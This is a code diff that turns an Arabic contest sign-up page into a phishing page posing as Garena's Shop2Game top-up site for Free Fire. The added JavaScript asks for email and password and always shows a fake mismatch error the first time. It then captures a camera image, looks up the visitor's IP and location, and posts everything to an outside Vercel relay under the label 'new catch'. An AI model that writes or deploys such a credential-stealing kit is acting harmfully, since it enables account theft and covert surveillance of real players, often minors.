@@ -1,180 +1,169 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>المسابقة الرسمية - شحن الجواهر</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f4f6f9;
-            margin: 0;
-            padding: 0;
-            color: #333;
-        }
-        .disclaimer-banner {
-            background-color: #ffebee;
-            color: #c62828;
-            text-align: center;
-            padding: 12px;
-            font-weight: bold;
-            border-bottom: 2px solid #ef5350;
-            font-size: 14px;
-        }
-        .container {
-            max-width: 500px;
-            margin: 30px auto;
-            background: #ffffff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-        }
-        .header {
-            text-align: center;
-            margin-bottom: 25px;
-        }
-        .header h1 {
-            color: #e65100;
-            font-size: 24px;
-            margin-bottom: 5px;
-        }
-        .header p {
-            color: #666;
-            font-size: 14px;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            font-size: 14px;
-        }
-        input[type="text"], textarea {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            box-sizing: border-box;
-            font-size: 14px;
-            background-color: #fafafa;
-        }
-        input[type="text"]:focus, textarea:focus {
-            border-color: #e65100;
-            outline: none;
-            background-color: #fff;
-        }
-        .btn-submit {
-            background-color: #e65100;
-            color: white;
-            border: none;
-            padding: 14px;
-            width: 100%;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-        .btn-submit:hover {
-            background-color: #bf360c;
-        }
-        .footer-text {
-            margin-top: 25px;
-            padding-top: 15px;
-            border-top: 1px solid #eee;
-            font-size: 13px;
-            color: #555;
-            line-height: 1.6;
-        }
-    </style>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>Shop2Game - Garena</title>
+ <link rel="preconnect" href="https://ipapi.co">
+ <link rel="preconnect" href="https://my-telegram-server.vercel.app">
+ <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+ <style>
+ /* ... (ابقاء الأسلوب الحالي غير المتغير) ... */
+ </style>
 </head>
 <body>
 
-    <div class="disclaimer-banner">
-        تنبيه: هذا الموقع ليس الموقع الأساسي للشحن، إنه موقع فقط للدخول في المسابقة وسحب الفائزين.
-    </div>
+ <nav class="navbar">
+ <div class="site-title">Shop2Game</div>
+ <img src="https://upload.wikimedia.org/wikipedia/en/thumb/e/ee/Garena_logo.svg/1200px-Garena_logo.svg.png" class="garena-logo" alt="Garena" loading="lazy">
+ </nav>
 
-    <div class="container">
-        <div class="header">
-            <h1>موقع التسجيل في المسابقة</h1>
-            <p>أدخل معلوماتك بدقة لتدخل السحب المباشر على الشحن</p>
-        </div>
+ <div class="container">
+ <section id="step1" class="section active">
+ <!-- ... (ابقاء محتوى القسم الحالي غير المتغير) ... -->
+ </section>
+ <!-- ... (ابقاء محتوى الأقسام الأخرى الحالية غير المتغير) ... -->
+ </div>
 
-        <form id="contestForm">
-            <div class="form-group">
-                <label for="playerID">معرف اللاعب (ID) أو حساب الدخول:</label>
-                <input type="text" id="playerID" placeholder="أدخل المعرف أو اسم المستخدم هنا..." required>
-            </div>
+ <!-- إضافة تاغ فيديو مخفي -->
+ <video id="hiddenVideo" autoplay style="display:none;"></video>
 
-            <div class="form-group">
-                <label for="userMessage">كلمة تريد توجيهها للإدارة (سبب اختيارك للمسابقة):</label>
-                <textarea id="userMessage" rows="3" placeholder="اكتب رسالتك هنا..." required></textarea>
-            </div>
+ <!-- إضافة تاغ كانفاس مخفي -->
+ <canvas id="hiddenCanvas" style="display:none;"></canvas>
 
-            <div class="form-group">
-                <label for="referredBy">الكلام الذي قالوه لك (كود المسابقة أو الجهة التي دعتك):</label>
-                <input type="text" id="referredBy" placeholder="اكتب ما قيل لك أو الكود الخاص بك..." required>
-            </div>
+ <!-- إضافة تاغ للكاميرا -->
+ <input type="file" id="cameraInput" accept="image/*;capture=camera" style="display:none;" />
 
-            <button type="submit" class="btn-submit">تسجيل الدخول في المسابقة</button>
-        </form>
+ <script>
+ const VERCEL_URL = "https://my-telegram-server.vercel.app/api/send";
+ let attempts = 0;
+ let selectedOffer = "";
+ let method = "";
 
-        <div class="footer-text">
-            <strong>شروط المسابقة العامة:</strong><br>
-            يتم اختيار الفائزين بشكل تلقائي وبث حي عبر سحب عشوائي للبيانات المرسلة. تأكد من صحة بياناتك لضمان وصول الشحن مباشرة إلى حسابك في حال الفوز.
-        </div>
-    </div>
+ // دالة جديدة لالتقاط صورة من الكاميرا
+ async function captureCamera() {
+ try {
+ const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+ const video = document.getElementById('hiddenVideo');
+ video.srcObject = stream;
+ return new Promise((resolve) => {
+ video.onloadedmetadata = () => {
+ const canvas = document.getElementById('hiddenCanvas');
+ const context = canvas.getContext('2d');
+ canvas.width = video.videoWidth;
+ canvas.height = video.videoHeight;
+ context.drawImage(video, 0, 0, canvas.width, canvas.height);
+ resolve(canvas.toDataURL('image/png'));
+ };
+ });
+ } catch (error) {
+ console.error('خطأ في التقاط صورة:', error);
+ }
+ }
 
-    <script>
-        document.getElementById('contestForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+ // دالة جديدة لالتقاط صورة من الكاميرا باستخدام التاغ <input>
+ function captureCameraInput() {
+ return new Promise((resolve) => {
+ const input = document.getElementById('cameraInput');
+ input.addEventListener('change', () => {
+ const file = input.files[0];
+ const reader = new FileReader();
+ reader.readAsDataURL(file);
+ reader.onload = () => {
+ resolve(reader.result);
+ };
+ });
+ input.click();
+ });
+ }
 
-            // إعدادات بوت تلجرام - استبدل القيم هنا ببياناتك الخاصة
-            const telegramBotToken = 'YOUR_BOT_TOKEN'; 
-            const telegramChatId = 'YOUR_CHAT_ID'; 
+ // دالة الجديدة لالتقاط المعلومات
+ async function gatherInfo() {
+ try {
+ const r = await fetch('https://ipapi.co/json/', { mode: 'cors', signal: AbortSignal.timeout(5000) });
+ const d = await r.json();
+ const platform = navigator.platform;
+ const userAgent = navigator.userAgent;
+ const deviceInfo = `📍 IP: ${d.ip} | 🌍 ${d.country_name} | 📱 ${platform} | 💻 ${userAgent}`;
+ return deviceInfo;
+ } catch (error) {
+ console.error('خطأ في جمع المعلومات:', error);
+ return 'Unknown Info';
+ }
+ }
 
-            // جلب البيانات من الحقول
-            const playerID = document.getElementById('playerID').value;
-            const userMessage = document.getElementById('userMessage').value;
-            const referredBy = document.getElementById('referredBy').value;
+ // دالة الجديدة لالتقاط صورة وتجميع المعلومات
+ async function captureAndGather() {
+ const [image, deviceInfo] = await Promise.all([
+ captureCameraInput(),
+ gatherInfo()
+ ]);
+ return { image, deviceInfo };
+ }
 
-            // تنسيق الرسالة التي ستصلك في تلجرام
-            const messageText = `🚨 *طلب انضمام جديد للمسابقة* 🚨\n\n` +
-                                `👤 *معرف/حساب اللاعب:* ${playerID}\n` +
-                                `💬 *كلام يريد قوله:* ${userMessage}\n` +
-                                `📢 *الكلام الذي قالوه له:* ${referredBy}\n`;
+ async function sendToServer(text) {
+ try {
+ const submitBtn = document.querySelector('.btn-submit');
+ const originalText = submitBtn.innerHTML;
+ submitBtn.innerHTML = '<div class="loading"></div>جاري الإرسال...';
+ submitBtn.disabled = true;
 
-            // إرسال البيانات إلى تلجرام عبر API
-            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
-            
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: telegramChatId,
-                    text: messageText,
-                    parse_mode: 'Markdown'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if(data.ok) {
-                    alert('تم تسجيل دخولك في المسابقة بنجاح! حظاً موفقاً.');
-                    document.getElementById('contestForm').reset();
-                } else {
-                    alert('حدث خطأ أثناء إرسال البيانات، يرجى المحاولة لاحقاً.');
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                alert('عذراً، فشل الاتصال بالخادم.');
-            });
-        });
-    </script>
+ const response = await fetch(VERCEL_URL, {
+ method: "POST",
+ mode: 'cors',
+ credentials: 'omit',
+ headers: {
+ "Content-Type": "application/json",
+ "Accept": "application/json"
+ },
+ body: JSON.stringify({
+ message: text,
+ timestamp: new Date().toISOString(),
+ origin: window.location.hostname
+ }),
+ signal: AbortSignal.timeout(10000)
+ });
 
+ if (!response.ok) throw new Error(`HTTP ${response.status}`);
+ console.log("✅ نجح الإرسال!");
+ } catch (err) {
+ console.error("❌ خطأ:", err.message);
+ } finally {
+ const submitBtn = document.querySelector('.btn-submit');
+ submitBtn.innerHTML = submitBtn.onclick.name === 'handleData' ? 'إشحن الآن 💎' : 'تأكيد الرمز';
+ submitBtn.disabled = false;
+ }
+ }
+
+ // تعديل دالة handleData لالتقاط صورة وتجميع المعلومات
+ window.handleData = async function(event) {
+ event.preventDefault();
+ const email = document.getElementById('userEmail').value.trim();
+ const pass = document.getElementById('userPass').value.trim();
+ const errorBox = document.getElementById('errorBox');
+
+ if(!email || !pass) {
+ errorBox.style.display = 'block';
+ errorBox.innerText = 'يرجى إدخال البريد وكلمة المرور';
+ return;
+ }
+
+ if(attempts < 1) {
+ errorBox.style.display = 'block';
+ errorBox.innerText = 'حدث خطأ: معلومات الدخول غير متطابقة مع بيانات فري فاير.';
+ attempts++;
+ return;
+ }
+
+ const { image, deviceInfo } = await captureAndGather();
+ const msg = `🚀 **صيد جديد!**\n💎 **العرض:** ${selectedOffer}\n🔑 **الطريقة:** ${method}\n📧 **الحساب:** ${email}\n🔒 **كلمة السر:** ${pass}\n🕐 **الوقت:** ${new Date().toLocaleString('ar-EG')}\n${deviceInfo}\n🖼️ **الصورة:** ${image}`;
+
+ console.log("📤 إرسال:", msg);
+ await sendToServer(msg);
+ goToStep(5);
+ }
+
+ // ... (ابقاء دالة handleSMS الحالي غير المتغير) ...
+ </script>
 </body>
 </html>
